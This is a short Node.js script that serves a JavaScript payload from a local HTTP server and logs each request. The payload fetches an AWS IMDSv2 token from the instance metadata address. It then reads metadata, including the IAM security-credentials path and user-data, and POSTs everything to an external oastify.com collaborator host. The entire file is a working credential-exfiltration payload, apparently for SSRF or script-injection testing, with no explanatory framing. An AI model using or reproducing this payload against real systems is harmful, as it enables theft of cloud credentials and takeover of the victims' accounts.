const http = require('http');
const fs = require('fs');

const payload = `
(async () => {
  const COLLAB = 'https://lxz8dnghrnrokqljztt5lhzu7ldgl8px.oastify.com';
  const ping = (data) => fetch(COLLAB, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(() => {});

  await ping({ stage: 'payload-executed' });

  try {
    const t = await fetch('http://169.254.169.254/latest/api/token', {
      method: 'PUT',
      headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }
    });
    const token = await t.text();
    const H = { 'X-aws-ec2-metadata-token': token };
    const grab = async (p) => {
      try {
        const r = await fetch('http://169.254.169.254/latest/meta-data/' + p, { headers: H });
        return await r.text();
      } catch (e) { return 'ERR: ' + e.message; }
    };

    const results = {};
    for (const p of ['ami-id','instance-id','instance-type','placement/region',
                     'iam/security-credentials/','latest/user-data']) {
      results[p] = await grab(p);
    }
    await ping({ metadata: results });
  } catch (e) {
    await ping({ error: e.message });
  }
})();
`;

http.createServer((req, res) => {
  console.log(`[+] Hit: ${req.url} from ${req.socket.remoteAddress}`);
  res.writeHead(200, { 'Content-Type': 'application/javascript' });
  res.end(payload);
}).listen(3000, () => console.log('Listening on 3000'));
